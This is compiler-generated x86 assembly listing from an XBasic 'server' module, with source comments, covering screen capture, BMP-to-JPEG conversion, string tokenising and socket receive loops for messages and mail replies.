	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,2			;;; i659
	mov	d[eax+24],ebx			;;; i13b
;
; [2646] jcprops.JPGColor       = $$IJL_YCBCR
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,3			;;; i659
	mov	d[eax+56],ebx			;;; i13b
;
; [2647] jcprops.JPGChannels    = 3
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,3			;;; i659
	mov	d[eax+52],ebx			;;; i13b
;
; [2648] jcprops.JPGSubsampling = $$IJL_411
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,1			;;; i659
	mov	d[eax+60],ebx			;;; i13b
;
; [2649] jcprops.DIBBytes       = &image[54]
	mov	edx,d[ebp+8]			;;; i665
	lea	eax,[edx+54]			;;; i464
	mov	ebx,d[%44%jcprops.server]			;;; i663a
	mov	d[ebx+4],eax			;;; i13b
;
; [2650] jcprops.DIBPadBytes    = IJL_DIB_PAD_BYTES (width)
	push	[ebp-44]			;;; i674a
	call	func45.server			;;; i619
	mov	ebx,d[%44%jcprops.server]			;;; i663a
	mov	d[ebx+16],eax			;;; i13b
;
; [2651] jcprops.JPGFile        = &file$
	mov	eax,d[ebp+12]			;;; i642
	mov	ebx,d[%44%jcprops.server]			;;; i663a
	mov	d[ebx+32],eax			;;; i13b
;
; [2652] jcprops.JPGWidth       = width
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[eax+44],ebx			;;; i13b
;
; [2653] jcprops.JPGHeight      = height
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,d[ebp-48]			;;; i665
	mov	d[eax+48],ebx			;;; i13b
;
; [2654] jcprops.jquality       = quality
	mov	eax,d[%44%jcprops.server]			;;; i663a
	mov	ebx,d[ebp+16]			;;; i665
	mov	d[eax+80],ebx			;;; i13b
;
; [2656] 'write image[] to file
;
; [2657] ret = @pijlWrite(&jcprops, $$IJL_JFILE_WRITEWHOLEIMAGE)
#ifdef BmpToJPGEx.ret
#undef BmpToJPGEx.ret
#endif
#define BmpToJPGEx.ret ebp-60	; exposes local variable 'ret'
;
	mov	eax,d[%44%pijlWrite.server]			;;; i663a
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.378			;;; i604
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%44%jcprops.server]			;;; i642
; .xstk44.0001 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	push	8			;;; i656a
	push	[ebp-68]			;;; i674a
	mov	eax,d[ebp-56]			;;; i665
	call	eax			;;; i620
A.378:
	mov	d[ebp-60],eax			;;; i670
;
; [2658] @pijlFree (&jcprops)
	mov	eax,d[%44%pijlFree.server]			;;; i663a
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.379			;;; i604
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%44%jcprops.server]			;;; i642
	push	eax			;;; i667a
	mov	eax,d[ebp-56]			;;; i665
	call	eax			;;; i620
A.379:
;
; [2659] IF (err != $$IJL_OK) THEN
#ifdef BmpToJPGEx.err
#undef BmpToJPGEx.err
#endif
#define BmpToJPGEx.err ebp-72	; exposes local variable 'err'
;
	mov	eax,d[ebp-72]			;;; i665
	cmp	eax,0			;;; i684a
	je	>> else.0110.server			;;; i219
;
; [2660] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func44.server			;;; i258
;
; [2661] ELSE
	jmp	end.if.0110.server			;;; i107
else.0110.server:
;
; [2662] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func44.server			;;; i258
;
; [2663] END IF
end.if.0110.server:
;
; [2664] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.BmpToJPGEx.server:  ;;; Function end label for Assembly Programmers.
end.func44.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  BmpToJPGEx ()  *****
;  *****
;
; [2666] FUNCTION CaptureScrEx (UBYTE image[])
.code
;
#ifdef CaptureScrEx.image
#undef CaptureScrEx.image
#endif
#define CaptureScrEx.image ebp+8	; exposes function argument 'image'
;
align 16
_CaptureScrEx.server@4:
;  *****
;  *****  FUNCTION  CaptureScrEx ()  *****
;  *****
func43.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,4				;;; ..
	xor	eax,eax			;;; ...
A.387:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.387			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,156			;;; i114a
;
funcBody43.server:
;
; [2667] STATIC BITMAP bmp
data section 'globals$statics'
align	4
%43%bmp.server:	db 4 dup ?
.code
;
; [2670] hdcScreen = CreateDCA(&"DISPLAY", 0, 0, 0)
#ifdef CaptureScrEx.hdcScreen
#undef CaptureScrEx.hdcScreen
#endif
#define CaptureScrEx.hdcScreen ebp-40	; exposes local variable 'hdcScreen'
;
;
; [0] EXTERNAL FUNCTION  CreateDCA                  (lpDriverName, lpPrinterName, lpOutput, lpInitData)
	mov	eax,addr @_string.053E.server			;;; i642
; .xstk43.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	call	_CreateDCA@16			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [2671] hdcScreenCompat = CreateCompatibleDC(hdcScreen)
#ifdef CaptureScrEx.hdcScreenCompat
#undef CaptureScrEx.hdcScreenCompat
#endif
#define CaptureScrEx.hdcScreenCompat ebp-52	; exposes local variable 'hdcScreenCompat'
;
;
; [0] EXTERNAL FUNCTION  CreateCompatibleDC         (hdc)
	push	[ebp-40]			;;; i674a
	call	_CreateCompatibleDC@4			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [2673] bmp.bitsPixel = GetDeviceCaps(hdcScreen, $$BITSPIXEL)
;
; [0] EXTERNAL FUNCTION  GetDeviceCaps              (hdc, index)
	push	12			;;; i656a
	push	[ebp-40]			;;; i674a
	call	_GetDeviceCaps@8			;;; i619
	mov	ebx,d[%43%bmp.server]			;;; i663a
	mov	w[ebx+18],ax			;;; i13b
;
; [2674] bmp.planes    = GetDeviceCaps(hdcScreen, $$PLANES)
	push	14			;;; i656a
	push	[ebp-40]			;;; i674a
	call	_GetDeviceCaps@8			;;; i619
	mov	ebx,d[%43%bmp.server]			;;; i663a
	mov	w[ebx+16],ax			;;; i13b
;
; [2675] bmp.width     = GetDeviceCaps(hdcScreen, $$HORZRES)
	push	8			;;; i656a
	push	[ebp-40]			;;; i674a
	call	_GetDeviceCaps@8			;;; i619
	mov	ebx,d[%43%bmp.server]			;;; i663a
	mov	d[ebx+4],eax			;;; i13b
;
; [2676] bmp.height    = GetDeviceCaps(hdcScreen, $$VERTRES)
	push	10			;;; i656a
	push	[ebp-40]			;;; i674a
	call	_GetDeviceCaps@8			;;; i619
	mov	ebx,d[%43%bmp.server]			;;; i663a
	mov	d[ebx+8],eax			;;; i13b
;
; [2677] bmp.widthBytes = ((bmp.width + 15) &~15)/8
	mov	eax,d[%43%bmp.server]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
	mov	ebx,15			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.383			;;; i367
	call	%_eeeOverflow			;;; i368
A.383:
	add	eax,ebx			;;; i772
	jnc	> A.384			;;; i773
	call	%_eeeOverflow			;;; i774
A.384:
	mov	ebx,15			;;; i659
	not	ebx			;;; i923
	and	eax,ebx			;;; i769
	mov	esi,8
	cdq	
	idiv	esi
	mov	ebx,d[%43%bmp.server]			;;; i663a
	mov	d[ebx+12],eax			;;; i13b
;
; [2679] hbmpCompat = CreateBitmap(bmp.width, bmp.height, bmp.planes, bmp.bitsPixel, 0)
#ifdef CaptureScrEx.hbmpCompat
#undef CaptureScrEx.hbmpCompat
#endif
#define CaptureScrEx.hbmpCompat ebp-56	; exposes local variable 'hbmpCompat'
;
;
; [0] EXTERNAL FUNCTION  CreateBitmap               (nWidth, nHeight, cPlanes, cBitsPerPel, lpvBits)  
	mov	eax,d[%43%bmp.server]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[%43%bmp.server]			;;; i663a
	mov	eax,d[eax+8]			;;; i313b
; .xstk43.0001 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[%43%bmp.server]			;;; i663a
	movzx	eax,w[eax+16]			;;; i313b
; .xstk43.0002 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[%43%bmp.server]			;;; i663a
	movzx	eax,w[eax+18]			;;; i313b
; .xstk43.0003 = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-80]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	_CreateBitmap@20			;;; i619
	mov	d[ebp-56],eax			;;; i670
;
; [2680] SelectObject(hdcScreenCompat, hbmpCompat)
;
; [0] EXTERNAL FUNCTION  SelectObject               (hdc, object)
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	_SelectObject@8			;;; i619
;
; [2682] BitBlt(hdcScreenCompat, 0, 0, bmp.width, bmp.height, hdcScreen, 0, 0, $$SRCCOPY)
;
; [0] EXTERNAL FUNCTION  BitBlt                     (hdc, x, y, w, h, hdcImage, xSrc, ySrc, mode)
	mov	eax,d[%43%bmp.server]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[%43%bmp.server]			;;; i663a
	mov	eax,d[eax+8]			;;; i313b
	mov	d[ebp-64],eax			;;; i670
	push	13369376			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-40]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_BitBlt@36			;;; i619
;
; [2683] ret = GetImage (hbmpCompat,@image[])
#ifdef CaptureScrEx.ret
#undef CaptureScrEx.ret
#endif
#define CaptureScrEx.ret ebp-84	; exposes local variable 'ret'
;
	push	[ebp+8]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	func42.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	d[ebp+8],ecx			;;; i670
	mov	d[ebp-84],eax			;;; i670
;
; [2685] DeleteObject(hbmpCompat)
;
; [0] EXTERNAL FUNCTION  DeleteObject               (object)
	push	[ebp-56]			;;; i674a
	call	_DeleteObject@4			;;; i619
;
; [2686] DeleteDC(hdcScreenCompat)
;
; [0] EXTERNAL FUNCTION  DeleteDC                   (hdc)
	push	[ebp-52]			;;; i674a
	call	_DeleteDC@4			;;; i619
;
; [2687] DeleteDC(hdcScreen)
	push	[ebp-40]			;;; i674a
	call	_DeleteDC@4			;;; i619
;
; [2688] RETURN ret
	mov	eax,d[ebp-84]			;;; i665
	jmp	end.func43.server			;;; i258
;
; [2689] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CaptureScrEx.server:  ;;; Function end label for Assembly Programmers.
end.func43.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  CaptureScrEx ()  *****
;  *****
;
; [2691] FUNCTION GetToken (str$,msg$,term)
.code
;
#ifdef GetToken.str$
#undef GetToken.str$
#endif
#define GetToken.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef GetToken.msg$
#undef GetToken.msg$
#endif
#define GetToken.msg$ ebp+12	; exposes function argument 'msg$'
;
;
#ifdef GetToken.term
#undef GetToken.term
#endif
#define GetToken.term ebp+16	; exposes function argument 'term'
;
align 16
_GetToken.server@12:
;  *****
;  *****  FUNCTION  GetToken ()  *****
;  *****
funcF.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBodyF.server:
;
; [2694] IFZ str$ THEN RETURN $$FALSE
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.388			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0111.server			;;; i192
A.388:
	mov	eax,0			;;; i659
	jmp	end.funcF.server			;;; i258
else.0111.server:
end.if.0111.server:
;
; [2696] len = LEN(str$)
#ifdef GetToken.len
#undef GetToken.len
#endif
#define GetToken.len ebp-40	; exposes local variable 'len'
;
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.389			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.389:
	mov	d[ebp-40],eax			;;; i670
;
; [2697] msg$=""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2699] FOR p = 0 TO len-1
#ifdef GetToken.p
#undef GetToken.p
#endif
#define GetToken.p ebp-44	; exposes local variable 'p'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i665
	sub	eax,1			;;; i791
; .forlimitF.0112 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
align 8
for.0112.server:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0112.server			;;; i154
;
; [2700] IF str${p} = term THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	ebx,d[ebp+16]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0113.server			;;; i219
;
; [2701] INC p
	inc	d[ebp-44]			;;; i84
;
; [2702] str$ = RIGHT$(str$,len-p)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2703] RETURN p
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.funcF.server			;;; i258
;
; [2704] ELSE
	jmp	end.if.0113.server			;;; i107
else.0113.server:
;
; [2705] msg$ = msg$ + CHR$(str${p})
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_chr.d			;;; i575
	add	esp,64			;;; i600
	mov	ebx,[ebp+12]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2706] END IF
end.if.0113.server:
;
; [2707] NEXT p
do.next.0112.server:
	inc	d[ebp-44]			;;; i229
	jmp	for.0112.server			;;; i231
end.for.0112.server:
;
; [2709] str$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2710] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.funcF.server			;;; i258
;
; [2712] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetToken.server:  ;;; Function end label for Assembly Programmers.
end.funcF.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetToken ()  *****
;  *****
;
; [2714] FUNCTION ListenMsg (sock)
.code
;
#ifdef ListenMsg.sock
#undef ListenMsg.sock
#endif
#define ListenMsg.sock ebp+8	; exposes function argument 'sock'
;
align 16
_ListenMsg.server@4:
;  *****
;  *****  FUNCTION  ListenMsg ()  *****
;  *****
func26.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func26.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody26.server:
;
; [2715] SHARED XLONG tBytesRecvA
;
; [2716] SHARED APPLSTATUS
;
; [2717] SHARED CONNECTED
;
; [2718] STRING buffer
#ifdef ListenMsg.buffer
#undef ListenMsg.buffer
#endif
#define ListenMsg.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [2721] DO
align 8
do.0114.server:
;
; [2722] buffer = NULL$($$MAX_LBUFFER)
	sub	esp,64			;;; i487
	mov	d[esp],4096
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2723] bytesRead = recv (sock, &buffer, $$MAX_LBUFFER, 0)
#ifdef ListenMsg.bytesRead
#undef ListenMsg.bytesRead
#endif
#define ListenMsg.bytesRead ebp-44	; exposes local variable 'bytesRead'
;
;
; [0] EXTERNAL SFUNCTION  recv             (socket, addrBuffer, length, flags)
	mov	eax,d[ebp-40]			;;; i642
; .xstk26.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	4096			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_recv@16			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2725] IF (bytesRead == $$SOCKET_ERROR || bytesRead == 0) THEN
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.394			;;; i467
	not	eax			;;; i468
A.394:
;+peep
	mov	ebx,d[ebp-44]			;;; i665
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.395			;;; i467
	not	ebx			;;; i468
A.395:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0115.server			;;; i221
;
; [2726] EXIT DO
	jmp	end.do.0114.server			;;; i144
;
; [2727] ELSE
	jmp	end.if.0115.server			;;; i107
else.0115.server:
;
; [2728] tBytesRecvA = tBytesRecvA + bytesRead
	mov	eax,d[%tBytesRecvA.server]			;;; i663a
	mov	ebx,d[ebp-44]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[%tBytesRecvA.server],eax			;;; i668
;
; [2729] MessagePump (sock,LEFT$(buffer,bytesRead))
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func5.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2730] END IF
end.if.0115.server:
;
; [2732] LOOP WHILE ((APPLSTATUS == $$TRUE) AND (CONNECTED == $$TRUE))
do.loop.0114.server:
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.396			;;; i467
	not	eax			;;; i468
A.396:
;+peep
	mov	ebx,d[%CONNECTED.server]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.397			;;; i467
	not	ebx			;;; i468
A.397:
;+peep
	and	eax,ebx			;;; i769
	test	eax,eax			;;; i194
	jnz	< do.0114.server			;;; i195
end.do.0114.server:
;
; [2734] CONNECTED = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%CONNECTED.server],eax			;;; i668
;
; [2735] #StreamKey = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%#StreamKey.server],eax			;;; i668
;
; [2737] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func26.server			;;; i258
;
; [2738] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ListenMsg.server:  ;;; Function end label for Assembly Programmers.
end.func26.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func26.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func26.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ListenMsg ()  *****
;  *****
;
; [2740] FUNCTION ListenMail (sock)
.code
;
#ifdef ListenMail.sock
#undef ListenMail.sock
#endif
#define ListenMail.sock ebp+8	; exposes function argument 'sock'
;
align 16
_ListenMail.server@4:
;  *****
;  *****  FUNCTION  ListenMail ()  *****
;  *****
func25.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func25.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.405:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.405			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody25.server:
;
; [2741] SHARED tBytesRecvA
;
; [2742] SHARED APPLSTATUS
;
; [2743] SHARED STRING MailReply
;
; [2744] STRING buffer
#ifdef ListenMail.buffer
#undef ListenMail.buffer
#endif
#define ListenMail.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [2747] DO
align 8
do.0116.server:
;
; [2748] buffer = NULL$($$MAX_LBUFFER)
	sub	esp,64			;;; i487
	mov	d[esp],4096
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2749] bytesRead = recv (sock, &buffer, $$MAX_LBUFFER, 0)
#ifdef ListenMail.bytesRead
#undef ListenMail.bytesRead
#endif
#define ListenMail.bytesRead ebp-44	; exposes local variable 'bytesRead'
;
	mov	eax,d[ebp-40]			;;; i642
; .xstk25.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	4096			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_recv@16			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2751] IF (bytesRead == $$SOCKET_ERROR || bytesRead == 0) THEN
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.401			;;; i467
	not	eax			;;; i468
A.401:
;+peep
	mov	ebx,d[ebp-44]			;;; i665
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.402			;;; i467
	not	ebx			;;; i468
A.402:
;+peep
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0117.server			;;; i221
;
; [2752] EXIT DO
	jmp	end.do.0116.server			;;; i144
;
; [2753] ELSE
	jmp	end.if.0117.server			;;; i107
else.0117.server:
;
; [2754] PRINT LEFT$(buffer,bytesRead)
; .filenumber = ebp-56	; internal variable
	push	1			;;; i844
	sub	esp,64			;;; i845
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	add	esp,64
	call	%_PrintWithNewlineThenFree			;;; i859
	add	esp,4
;
; [2755] MailReply = MailReply + LEFT$(buffer,bytesRead)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,[%MailReply.server]			;;; i663a
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %MailReply.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2756] END IF
end.if.0117.server:
;
; [2758] LOOP WHILE (APPLSTATUS == $$TRUE)
do.loop.0116.server:
	mov	eax,d[%APPLSTATUS.server]			;;; i663a
	cmp	eax,-1			;;; i684a
	je	< do.0116.server			;;; i193
end.do.0116.server:
;
; [2760] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func25.server			;;; i258
;
; [2761] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ListenMail.server:  ;;; Function end label for Assembly Programmers.
end.func25.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func25.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func25.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ListenMail ()  *****
;  *****
;
; [2763] FUNCTION GetImage (hImage, UBYTE image[])
.code
;
#ifdef GetImage.hImage
#undef GetImage.hImage
#endif
#define GetImage.hImage ebp+8	; exposes function argument 'hImage'
;
;
#ifdef GetImage.image
#undef GetImage.image
#endif
#define GetImage.image ebp+12	; exposes function argument 'image'
;
align 16
_GetImage.server@8:
;  *****
;  *****  FUNCTION  GetImage ()  *****
;  *****
func42.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.408:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
